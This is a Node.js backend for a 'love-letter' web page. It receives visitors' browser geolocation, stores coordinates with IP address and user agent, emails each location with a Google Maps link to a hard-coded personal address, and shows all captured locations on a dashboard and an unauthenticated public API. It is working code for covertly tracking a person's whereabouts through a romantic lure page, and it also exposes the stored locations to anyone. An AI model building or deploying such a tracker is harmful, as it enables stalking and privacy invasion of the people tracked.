import http from "node:http";
import { randomUUID } from "node:crypto";
import fs from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import nodemailer from "nodemailer";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const dataDir = path.join(__dirname, "data");
const logFile = path.join(dataDir, "location-logs.json");

const PORT = Number.parseInt(process.env.PORT ?? "8787", 10);
const HOST = process.env.HOST ?? "127.0.0.1";
const MAX_LOG_ROWS = 5000;
const LOCATION_ALERT_EMAIL = process.env.LOCATION_ALERT_EMAIL ?? "muhammadakfz@gmail.com";
const LOCATION_EMAIL_ENABLED = (process.env.LOCATION_EMAIL_ENABLED ?? "true") !== "false";
const SMTP_HOST = process.env.SMTP_HOST ?? "";
const SMTP_PORT = Number.parseInt(process.env.SMTP_PORT ?? "587", 10);
const SMTP_SECURE = (process.env.SMTP_SECURE ?? "false") === "true";
const SMTP_USER = process.env.SMTP_USER ?? "";
const SMTP_PASS = process.env.SMTP_PASS ?? "";
const SMTP_FROM = process.env.SMTP_FROM ?? SMTP_USER;

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type"
};

let writeQueue = Promise.resolve();
const mailTransporter =
  LOCATION_EMAIL_ENABLED && SMTP_HOST && SMTP_USER && SMTP_PASS
    ? nodemailer.createTransport({
        host: SMTP_HOST,
        port: SMTP_PORT,
        secure: SMTP_SECURE,
        auth: {
          user: SMTP_USER,
          pass: SMTP_PASS
        }
      })
    : null;

async function ensureLogFile() {
  await fs.mkdir(dataDir, { recursive: true });

  try {
    await fs.access(logFile);
  } catch {
    await fs.writeFile(logFile, "[]\n", "utf8");
  }
}

async function readLogs() {
  await ensureLogFile();

  try {
    const text = await fs.readFile(logFile, "utf8");
    const parsed = JSON.parse(text);
    return Array.isArray(parsed) ? parsed : [];
  } catch {
    return [];
  }
}

function enqueueWrite(mutator) {
  writeQueue = writeQueue.then(async () => {
    const currentLogs = await readLogs();
    const nextLogs = mutator(currentLogs);
    await fs.writeFile(logFile, `${JSON.stringify(nextLogs, null, 2)}\n`, "utf8");
    return nextLogs;
  });

  return writeQueue;
}

function getClientIp(request) {
  const forwarded = request.headers["x-forwarded-for"];

  if (typeof forwarded === "string" && forwarded.length > 0) {
    return forwarded.split(",")[0].trim();
  }

  return request.socket.remoteAddress ?? "unknown";
}

function sendJson(response, status, payload, extraHeaders = {}) {
  response.writeHead(status, {
    "Content-Type": "application/json; charset=utf-8",
    ...extraHeaders
  });
  response.end(JSON.stringify(payload));
}

function sendHtml(response, status, html, extraHeaders = {}) {
  response.writeHead(status, {
    "Content-Type": "text/html; charset=utf-8",
    ...extraHeaders
  });
  response.end(html);
}

function sendNotFound(response) {
  sendJson(response, 404, { error: "Not Found" });
}

function parseJsonBody(request) {
  return new Promise((resolve, reject) => {
    let body = "";

    request.on("data", (chunk) => {
      body += chunk;

      if (body.length > 1_000_000) {
        reject(new Error("Payload terlalu besar"));
        request.destroy();
      }
    });

    request.on("end", () => {
      if (!body) {
        resolve({});
        return;
      }

      try {
        resolve(JSON.parse(body));
      } catch {
        reject(new Error("Body JSON tidak valid"));
      }
    });

    request.on("error", (error) => {
      reject(error);
    });
  });
}

function sanitizeNumber(input) {
  const value = Number.parseFloat(input);
  return Number.isFinite(value) ? value : null;
}

function escapeHtml(text) {
  return String(text)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
}

async function sendLocationEmail(logItem) {
  if (!LOCATION_EMAIL_ENABLED) {
    return { sent: false, reason: "disabled" };
  }

  if (!mailTransporter || !SMTP_FROM) {
    return { sent: false, reason: "smtp_not_configured" };
  }

  const subject = `Lokasi akses baru: ${logItem.latitude}, ${logItem.longitude}`;
  const text = [
    "Ada lokasi akses baru dari web love-letter.",
    "",
    `Waktu: ${logItem.timestamp}`,
    `Latitude: ${logItem.latitude}`,
    `Longitude: ${logItem.longitude}`,
    `Akurasi: ${logItem.accuracy ?? "-"} meter`,
    `Maps: ${logItem.mapUrl}`,
    `IP: ${logItem.ipAddress ?? "-"}`,
    `User Agent: ${logItem.userAgent ?? "-"}`,
    `Halaman: ${logItem.pageUrl ?? "-"}`
  ].join("\n");

  const html = `
    <h2>Lokasi akses baru</h2>
    <p>Ada lokasi akses baru dari web love-letter.</p>
    <ul>
      <li><strong>Waktu:</strong> ${escapeHtml(logItem.timestamp)}</li>
      <li><strong>Latitude:</strong> ${escapeHtml(logItem.latitude)}</li>
      <li><strong>Longitude:</strong> ${escapeHtml(logItem.longitude)}</li>
      <li><strong>Akurasi:</strong> ${escapeHtml(logItem.accuracy ?? "-")} meter</li>
      <li><strong>Maps:</strong> <a href="${escapeHtml(logItem.mapUrl)}">${escapeHtml(logItem.mapUrl)}</a></li>
      <li><strong>IP:</strong> ${escapeHtml(logItem.ipAddress ?? "-")}</li>
      <li><strong>User Agent:</strong> ${escapeHtml(logItem.userAgent ?? "-")}</li>
      <li><strong>Halaman:</strong> ${escapeHtml(logItem.pageUrl ?? "-")}</li>
    </ul>
  `;

  try {
    const info = await mailTransporter.sendMail({
      from: SMTP_FROM,
      to: LOCATION_ALERT_EMAIL,
      subject,
      text,
      html
    });

    return { sent: true, messageId: info.messageId };
  } catch (error) {
    console.error("Gagal mengirim email lokasi:", error);
    return {
      sent: false,
      reason: error instanceof Error ? error.message : "unknown_error"
    };
  }
}

function renderDashboardPage() {
  return `<!doctype html>
<html lang="id">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Dashboard Lokasi Akses</title>
    <style>
      :root {
        --ink: #2d2a32;
        --bg: #f6f8ff;
        --card: #ffffff;
        --line: #e6e8f2;
        --accent: #ff4f8b;
      }

      * {
        box-sizing: border-box;
      }

      body {
        margin: 0;
        font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
        color: var(--ink);
        background: radial-gradient(circle at 10% 12%, #ffe7f0 0%, transparent 30%),
          radial-gradient(circle at 90% 0%, #e9eeff 0%, transparent 28%),
          var(--bg);
      }

      .container {
        width: min(1180px, 95vw);
        margin: 28px auto;
      }

      h1 {
        margin: 0;
        color: var(--accent);
        font-size: clamp(1.5rem, 3vw, 2rem);
      }

      .subtitle {
        margin: 8px 0 18px;
        color: rgba(45, 42, 50, 0.7);
      }

      .stats {
        display: flex;
        flex-wrap: wrap;
        gap: 10px;
        margin-bottom: 14px;
      }

      .pill {
        background: var(--card);
        border: 1px solid var(--line);
        border-radius: 999px;
        padding: 7px 12px;
        font-size: 0.88rem;
      }

      .table-wrap {
        border: 1px solid var(--line);
        background: var(--card);
        border-radius: 14px;
        overflow: hidden;
        box-shadow: 0 12px 34px rgba(16, 22, 46, 0.08);
      }

      table {
        width: 100%;
        border-collapse: collapse;
      }

      thead {
        background: #f7f8fd;
      }

      th,
      td {
        padding: 11px 10px;
        border-bottom: 1px solid var(--line);
        text-align: left;
        font-size: 0.88rem;
        vertical-align: top;
      }

      th {
        font-size: 0.78rem;
        letter-spacing: 0.08em;
        text-transform: uppercase;
        color: rgba(45, 42, 50, 0.65);
      }

      tr:last-child td {
        border-bottom: 0;
      }

      a {
        color: #dd2b6b;
      }

      .empty {
        padding: 16px;
        font-size: 0.92rem;
      }

      code {
        background: #f2f4ff;
        border: 1px solid #e4e7ff;
        border-radius: 6px;
        padding: 0.1rem 0.35rem;
      }

      @media (max-width: 760px) {
        .table-wrap {
          overflow-x: auto;
        }

        table {
          min-width: 920px;
        }
      }
    </style>
  </head>
  <body>
    <main class="container">
      <h1>Dashboard Lokasi Akses</h1>
      <p class="subtitle">
        Data diambil dari <code>navigator.geolocation</code> pada web utama lalu disimpan oleh backend ini.
      </p>

      <div class="stats">
        <div class="pill">Total log: <strong id="total">0</strong></div>
        <div class="pill">Update terakhir: <strong id="updated">-</strong></div>
      </div>

      <div class="table-wrap">
        <table>
          <thead>
            <tr>
              <th>Waktu</th>
              <th>Latitude</th>
              <th>Longitude</th>
              <th>Akurasi (m)</th>
              <th>Google Maps</th>
              <th>IP</th>
              <th>User Agent</th>
              <th>Halaman</th>
            </tr>
          </thead>
          <tbody id="rows"></tbody>
        </table>

        <div class="empty" id="empty">Belum ada log lokasi.</div>
      </div>
    </main>

    <script>
      const totalNode = document.getElementById("total");
      const updatedNode = document.getElementById("updated");
      const rowsNode = document.getElementById("rows");
      const emptyNode = document.getElementById("empty");

      function cell(content) {
        const td = document.createElement("td");
        td.textContent = content;
        return td;
      }

      function linkCell(url, label) {
        const td = document.createElement("td");
        const a = document.createElement("a");
        a.href = url;
        a.target = "_blank";
        a.rel = "noreferrer";
        a.textContent = label;
        td.appendChild(a);
        return td;
      }

      function formatTimestamp(isoDate) {
        const date = new Date(isoDate);
        return Number.isNaN(date.getTime()) ? isoDate : date.toLocaleString();
      }

      async function loadLogs() {
        try {
          const response = await fetch("/api/location-logs");
          const payload = await response.json();
          const logs = Array.isArray(payload.logs) ? payload.logs : [];

          totalNode.textContent = String(logs.length);
          updatedNode.textContent = new Date().toLocaleTimeString();

          rowsNode.innerHTML = "";

          if (logs.length === 0) {
            emptyNode.hidden = false;
            return;
          }

          emptyNode.hidden = true;

          for (const log of logs) {
            const tr = document.createElement("tr");
            tr.appendChild(cell(formatTimestamp(log.timestamp)));
            tr.appendChild(cell(String(log.latitude)));
            tr.appendChild(cell(String(log.longitude)));
            tr.appendChild(cell(log.accuracy == null ? "-" : String(log.accuracy)));
            tr.appendChild(linkCell(log.mapUrl, "Buka maps"));
            tr.appendChild(cell(log.ipAddress || "-"));
            tr.appendChild(cell(log.userAgent || "-"));
            tr.appendChild(cell(log.pageUrl || "-"));
            rowsNode.appendChild(tr);
          }
        } catch (error) {
          updatedNode.textContent = "gagal refresh";
          emptyNode.hidden = false;
          emptyNode.textContent = "Gagal memuat data dari backend.";
          console.error(error);
        }
      }

      loadLogs();
      setInterval(loadLogs, 15000);
    </script>
  </body>
</html>`;
}

const server = http.createServer(async (request, response) => {
  const method = request.method ?? "GET";
  const url = new URL(request.url ?? "/", `http://${request.headers.host ?? `localhost:${PORT}`}`);

  if (method === "OPTIONS" && url.pathname.startsWith("/api/")) {
    response.writeHead(204, corsHeaders);
    response.end();
    return;
  }

  if (method === "GET" && url.pathname === "/") {
    sendHtml(
      response,
      200,
      `<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Love Letter Backend</title>
  </head>
  <body style="font-family: sans-serif; margin: 2rem; line-height: 1.5;">
    <h1>Love Letter Backend</h1>
    <p>Backend aktif.</p>
    <ul>
      <li><a href="/dashboard">Dashboard lokasi</a></li>
      <li><a href="/api/location-logs">API log lokasi</a></li>
    </ul>
  </body>
</html>`
    );
    return;
  }

  if (method === "GET" && url.pathname === "/health") {
    sendJson(response, 200, { status: "ok" });
    return;
  }

  if (method === "GET" && url.pathname === "/dashboard") {
    sendHtml(response, 200, renderDashboardPage());
    return;
  }

  if (method === "GET" && url.pathname === "/api/location-logs") {
    const logs = await readLogs();
    sendJson(response, 200, { logs }, corsHeaders);
    return;
  }

  if (method === "POST" && url.pathname === "/api/location") {
    try {
      const body = await parseJsonBody(request);
      const latitude = sanitizeNumber(body.latitude);
      const longitude = sanitizeNumber(body.longitude);
      const accuracy = sanitizeNumber(body.accuracy);

      if (latitude == null || latitude < -90 || latitude > 90) {
        sendJson(response, 400, { error: "latitude tidak valid" }, corsHeaders);
        return;
      }

      if (longitude == null || longitude < -180 || longitude > 180) {
        sendJson(response, 400, { error: "longitude tidak valid" }, corsHeaders);
        return;
      }

      const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
      const userAgent = String(request.headers["user-agent"] ?? "unknown").slice(0, 500);
      const pageUrl = typeof body.pageUrl === "string" ? body.pageUrl.slice(0, 2000) : null;

      const logItem = {
        id: randomUUID(),
        timestamp: new Date().toISOString(),
        latitude: Number(latitude.toFixed(6)),
        longitude: Number(longitude.toFixed(6)),
        accuracy: accuracy == null ? null : Number(accuracy.toFixed(2)),
        mapUrl,
        ipAddress: getClientIp(request),
        userAgent,
        pageUrl
      };

      await enqueueWrite((logs) => [logItem, ...logs].slice(0, MAX_LOG_ROWS));
      const emailResult = await sendLocationEmail(logItem);

      sendJson(response, 201, { ok: true, log: logItem, email: emailResult }, corsHeaders);
      return;
    } catch (error) {
      sendJson(
        response,
        400,
        { error: error instanceof Error ? error.message : "Gagal memproses request" },
        corsHeaders
      );
      return;
    }
  }

  sendNotFound(response);
});

await ensureLogFile();

if (LOCATION_EMAIL_ENABLED && !mailTransporter) {
  console.warn(
    "Email notifikasi belum aktif: set SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS, dan SMTP_FROM."
  );
}

server.listen(PORT, HOST, () => {
  console.log(`Location backend running at http://${HOST}:${PORT}`);
  console.log(`Dashboard: http://localhost:${PORT}/dashboard`);
});
